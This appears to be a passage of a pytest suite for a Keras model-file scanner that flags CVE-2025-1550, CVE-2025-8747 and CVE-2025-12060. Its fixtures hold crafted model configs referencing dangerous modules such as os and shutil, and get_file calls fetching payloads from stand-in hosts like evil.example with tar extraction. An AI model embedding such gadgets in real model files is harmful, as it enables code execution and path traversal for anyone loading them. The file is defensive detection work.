    def test_native_dangerous_module_prefix_collisions_are_not_critical(
        self,
        tmp_path: Path,
        module_value: str,
    ) -> None:
        """Dangerous native roots should use exact root matching."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "prefix_collision",
                        "config": {"fn_module": module_value},
                    }
                ]
            },
        }

        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-1550"]
        assert cve_issues
        assert all(issue.severity != IssueSeverity.CRITICAL for issue in cve_issues)

    def test_untrusted_module_custom_package(self, tmp_path: Path) -> None:
        """Unknown module references in callable context should be flagged as WARNING."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "fn_module": "my_custom_package.layers",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should flag non-allowlisted module"
        assert cve_issues[0].severity == IssueSeverity.WARNING

    def test_safe_keras_module_no_false_positive(self, tmp_path: Path) -> None:
        """A layer referencing 'keras.layers' should NOT be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Safe keras.layers module should not be flagged"

    def test_safe_tensorflow_module_no_false_positive(self, tmp_path: Path) -> None:
        """A layer referencing 'tensorflow.keras.layers' should NOT be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "tensorflow.keras.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Safe tensorflow module should not be flagged"

    def test_nested_model_module_reference(self, tmp_path: Path) -> None:
        """Dangerous module in nested model layer should be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "Dense",
                                    "name": "nested_evil",
                                    "module": "shutil",
                                    "config": {"units": 1},
                                }
                            ]
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous module in nested model"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE-2025-1550 details should be present in issue details."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "os",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-1550"
        assert details["cvss"] == 7.3
        assert details["cwe"] == "CWE-94"
        assert details["description"]

    def test_none_module_value_not_flagged(self, tmp_path: Path) -> None:
        """Layer with module=None should not trigger CVE-2025-1550."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": None,
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "None module should not trigger CVE"

    def test_non_callable_layer_unknown_module_not_flagged(self, tmp_path: Path) -> None:
        """Unknown module on non-callable layers should not produce noisy CVE warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "my_custom_package.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Non-callable layer module should not trigger CVE-2025-1550 warning"

    def test_prefix_collision_module_is_not_allowlisted(self, tmp_path: Path) -> None:
        """Module like 'mathutils.payload' should NOT be treated as safe 'math'."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "fn_module": "mathutils.payload",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "mathutils should not match safe 'math' prefix"
        assert cve_issues[0].severity == IssueSeverity.WARNING


class TestCVE20258747GetFileGadget:
    """Test CVE-2025-8747: keras.utils.get_file gadget bypass detection."""

    def test_get_file_reference_reuses_lowered_value_text(self) -> None:
        """Non-exact callable checks should lowercase each string once."""

        class CountingValue(str):
            lower_calls = 0

            def strip(self, chars: str | None = None, /) -> "CountingValue":
                return self

            def lower(self) -> str:
                type(self).lower_calls += 1
                return super().lower()

        assert _has_get_file_reference([CountingValue("pkg.keras.utils.get_file")])
        assert CountingValue.lower_calls == 1

    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with raw config string."""
        return _build_test_keras_zip(config_str, tmp_path, "3.5.0")

    def test_get_file_with_url_detected(self, tmp_path: Path) -> None:
        """Config referencing get_file with URL should be CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.utils",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.com/payload.bin",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_description_scoped_get_file_with_url_is_not_treated_as_documentation(self, tmp_path: Path) -> None:
        """Doc-like paths should still scan callable get_file plus URL fields."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "description": {
                    "fn": "keras.utils.get_file",
                    "url": "https://evil.com/payload.tar.gz",
                }
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1

    def test_description_class_name_get_file_docs_not_flagged(self, tmp_path: Path) -> None:
        """Doc tables that name get_file class fields should stay documentation-only."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "description": {
                    "class_name": "keras.utils.get_file",
                    "url": "https://docs.example/keras-get-file-guide",
                    "notes": "Documentation table describing the get_file function signature.",
                }
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert cve_issues == []

    def test_description_url_with_get_file_prose_not_flagged(self, tmp_path: Path) -> None:
        """Doc URLs plus prose mentions should not be treated as executable get_file calls."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "description": {
                    "summary": "Documentation example: keras.utils.get_file can download files in user code.",
                    "url": "https://docs.example/keras-get-file-guide",
                }
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert cve_issues == []

    def test_get_file_with_url_in_args_list_detected(self, tmp_path: Path) -> None:
        """Config with URL inside args list should also be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "args": ["https://evil.com/payload.bin"],
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL in args list as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_get_file_with_url_in_nested_kwargs_detected(self, tmp_path: Path) -> None:
        """Nested kwargs URL should still be attributed to the get_file invocation."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "kwargs": {"url": "https://evil.com/payload.bin"},
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL in nested kwargs as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_get_file_extract_tar_url_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """get_file(extract=True) with a remote tar URL should be attributed to CVE-2025-12060."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/payload.tar.gz",
                            "extract": True,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        details = cve_issues[0].details
        assert details["cvss"] == 8.8
        assert details["cwe"] == "CWE-22"
        assert "remediation" in details
        assert details["urls"] == ["https://evil.example/payload.tar.gz"]

    def test_get_file_extract_tar_url_in_kwargs_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """kwargs.origin plus kwargs.extract=True should be treated as a get_file extraction call."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "keras.utils.get_file",
                            "kwargs": {
                                "origin": "https://evil.example/payload.tgz",
                                "extract": True,
                            },
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["urls"] == ["https://evil.example/payload.tgz"]

    def test_get_file_extract_tar_archive_format_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """Explicit tar archive_format should not rely on a tar-looking URL suffix."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/download?id=payload",
                            "extract": True,
                            "archive_format": "tar",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["urls"] == ["https://evil.example/download"]

    def test_get_file_named_untar_detects_cve_2025_12060_without_tar_suffix(self, tmp_path: Path) -> None:
        """Named untar=True should mark a remote get_file URL as tar extraction."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/download",
                            "untar": True,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["urls"] == ["https://evil.example/download"]

    def test_get_file_extract_tar_url_fragment_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """URL fragments must not hide tar extraction gadgets from CVE attribution."""
        scanner = KerasZipScanner()
        archive_url = "https://user:pass@evil.example/payload.tar.gz?token=SECRET#comment-token"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": archive_url,
                            "extract": True,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        details = cve_issues[0].details
        assert details["urls"] == ["https://evil.example/payload.tar.gz"]
        assert "user" not in str(details)
        assert "pass" not in str(details)
        assert "SECRET" not in str(details)
        assert "comment-token" not in str(details)

    def test_get_file_extract_tar_url_fragment_in_kwargs_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """kwargs.origin fragments should remain part of the detected archive URL."""
        scanner = KerasZipScanner()
        archive_url = "https://evil.example/payload.tgz#fragment"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "keras.utils.get_file",
                            "kwargs": {
                                "origin": archive_url,
                                "extract": True,
                            },
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["urls"] == ["https://evil.example/payload.tgz"]

    def test_get_file_positional_extract_tar_url_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """Positional extract=True uses the tar-capable default auto format."""
        scanner = KerasZipScanner()
        archive_url = "https://evil.example/download"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "keras.utils.get_file",
                            "args": ["payload.tar.zst", archive_url, False, None, None, "datasets", "auto", True],
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["urls"] == [archive_url]

    def test_get_file_positional_tar_archive_format_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """Positional archive_format='tar' should not rely on a tar-looking URL suffix."""
        scanner = KerasZipScanner()
        archive_url = "https://evil.example/download?id=payload"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "keras.utils.get_file",
                            "args": ["payload", archive_url, False, None, None, "datasets", "auto", True, "tar"],
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["urls"] == ["https://evil.example/download"]

    def test_get_file_tar_url_without_extract_true_no_cve_2025_12060(self, tmp_path: Path) -> None:
        """Tar URLs are only CVE-2025-12060 when the same get_file call extracts them."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/payload.tar.gz",
                            "extract": False,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]

    def test_get_file_extract_zip_archive_format_no_cve_2025_12060(self, tmp_path: Path) -> None:
        """Explicit zip format disables tar extraction even for a tar-looking URL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/payload.tar.gz",
                            "extract": True,
                            "archive_format": "zip",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]

    def test_get_file_extract_default_auto_detects_generic_url_cve_2025_12060(self, tmp_path: Path) -> None:
        """Default auto format content-sniffs tar archives regardless of URL suffix."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/payload.bin",
                            "extract": True,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["urls"] == ["https://evil.example/payload.bin"]

    def test_get_file_extract_explicit_auto_detects_generic_url_cve_2025_12060(self, tmp_path: Path) -> None:
        """Explicit auto format also enables tar content sniffing."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "origin": "https://evil.example/download",
                            "extract": True,
                            "archive_format": "auto",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["urls"] == ["https://evil.example/download"]

    def test_get_file_extract_tar_in_format_list_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """A valid format list may try zip first and then tar."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "origin": "https://evil.example/download",
                            "extract": True,
                            "archive_format": ["zip", "tar"],
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]

    @pytest.mark.parametrize("archive_format", ["tgz", "tar.gz", "TAR", " tar "])
    def test_get_file_unsupported_archive_format_no_cve_2025_12060(
        self,
        tmp_path: Path,
        archive_format: str,
    ) -> None:
        """Unsupported aliases and normalized variants fail before extraction in Keras."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "origin": "https://evil.example/payload.tar.gz",
                            "extract": True,
                            "archive_format": archive_format,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]

    @pytest.mark.parametrize("archive_format", [None, [], ["auto", "tar"]])
    def test_get_file_non_tar_effective_format_no_cve_2025_12060(
        self,
        tmp_path: Path,
        archive_format: Any,
    ) -> None:
        """Disabled formats and a list that errors before tar cannot reach tar extraction."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "origin": "https://evil.example/payload.tar.gz",
                            "extract": True,
                            "archive_format": archive_format,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]

    @pytest.mark.parametrize(("argument", "value"), [("extract", 1), ("extract", "yes"), ("untar", 1)])
    def test_get_file_truthy_extraction_arguments_detect_cve_2025_12060(
        self,
        tmp_path: Path,
        argument: str,
        value: Any,
    ) -> None:
        """Keras uses Python truthiness rather than requiring literal booleans."""
        scanner = KerasZipScanner()
        call_config: dict[str, Any] = {
            "fn": "get_file",
            "origin": "https://evil.example/download",
            argument: value,
        }
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert cve_issues
        assert "Truthy" in cve_issues[0].details["description"]
        assert cve_issues[0].why is not None
        assert "truthy" in cve_issues[0].why

    @pytest.mark.parametrize(
        "call_config",
        [
            {
                "fn": "get_file",
                "kwargs": {"origin": "https://evil.example/download", "extract": "false"},
            },
            {
                "fn": "get_file",
                "kwargs": {"origin": "https://evil.example/download", "untar": 1},
            },
            {"fn": "get_file", "args": ["payload", "https://evil.example/download", "false"]},
            {
                "fn": "get_file",
                "args": [
                    "payload",
                    "https://evil.example/download",
                    False,
                    None,
                    None,
                    "datasets",
                    "auto",
                    1,
                ],
            },
        ],
    )
    def test_get_file_truthy_extraction_argument_forms_detect_cve_2025_12060(
        self,
        tmp_path: Path,
        call_config: dict[str, Any],
    ) -> None:
        """Truthy kwargs and positional values must match Keras extraction behavior."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]

    @pytest.mark.parametrize(
        "call_config",
        [
            {"fn": "get_file", "origin": "https://evil.example/download", "extract": False},
            {"fn": "get_file", "origin": "https://evil.example/download", "untar": 0},
            {
                "fn": "get_file",
                "kwargs": {"origin": "https://evil.example/download", "extract": ""},
            },
            {
                "fn": "get_file",
                "kwargs": {"origin": "https://evil.example/download", "untar": None},
            },
            {"fn": "get_file", "args": ["payload", "https://evil.example/download", []]},
            {
                "fn": "get_file",
                "args": [
                    "payload",
                    "https://evil.example/download",
                    False,
                    None,
                    None,
                    "datasets",
                    "auto",
                    {},
                ],
            },
        ],
    )
    def test_get_file_false_like_extraction_argument_forms_no_cve_2025_12060(
        self,
        tmp_path: Path,
        call_config: dict[str, Any],
    ) -> None:
        """False-like extraction values must not create archive-traversal false positives."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]

    def test_get_file_url_valued_kwargs_metadata_is_not_origin(self, tmp_path: Path) -> None:
        """URL-looking kwargs outside origin/url must not be reported as the downloaded archive."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "kwargs": {
                                "origin": "/local/model",
                                "file_hash": "https://docs.example/not-the-origin",
                                "extract": True,
                                "archive_format": "tar",
                            },
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]

    def test_get_file_url_valued_positional_fname_is_not_origin(self, tmp_path: Path) -> None:
        """Only positional index 1 is the remote get_file origin."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "args": [
                                "https://docs.example/not-the-origin",
                                "/local/model",
                                False,
                                None,
                                None,
                                "datasets",
                                "auto",
                                True,
                                "tar",
                            ],
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]

    def test_get_file_metadata_extract_tar_url_no_cve_2025_12060(self, tmp_path: Path) -> None:
        """Metadata nested beside get_file should not be mistaken for get_file extraction args."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "metadata": {
                                "origin": "https://evil.example/payload.tar.gz",
                                "extract": True,
                            },
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]

    def test_get_file_with_nested_metadata_url_not_flagged(self, tmp_path: Path) -> None:
        """Nested metadata URLs in the same node should not be treated as get_file arguments."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "metadata": {"homepage": "https://example.com/model-docs"},
                            "path": "/local/file.h5",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert cve_issues == [], "Nested metadata URLs should not trigger CVE-2025-8747"

    def test_get_file_with_url_and_comment_token_detected(self, tmp_path: Path) -> None:
        """Embedded comment tokens in URL strings should not suppress detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.com/payload.bin#comment-token",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["cve_id"] == "CVE-2025-8747"

    def test_get_file_without_url_no_trigger(self, tmp_path: Path) -> None:
        """Config with get_file but no URL should NOT trigger."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"fn": "get_file", "path": "/local/file.h5"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0, "get_file without URL should not trigger"

    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
        """Normal config should not trigger CVE-2025-8747."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0

    def test_get_file_and_url_in_different_contexts_not_flagged(self, tmp_path: Path) -> None:
        """Keyword co-occurrence across unrelated dicts should not trigger CVE."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [{"class_name": "Dense", "name": "dense_1", "config": {"fn": "get_file"}}],
                "metadata": {"download_url": "https://example.com/model-info"},
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0, "get_file and URL in unrelated contexts should not trigger CVE-2025-8747"

    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE details should be in issue details."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Dense",
                            "name": "d",
                            "config": {
                                "fn": "get_file",
                                "url": "http://evil.com/x",
                            },
                        }
                    ]
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-8747"
        assert details["cvss"] == 8.8
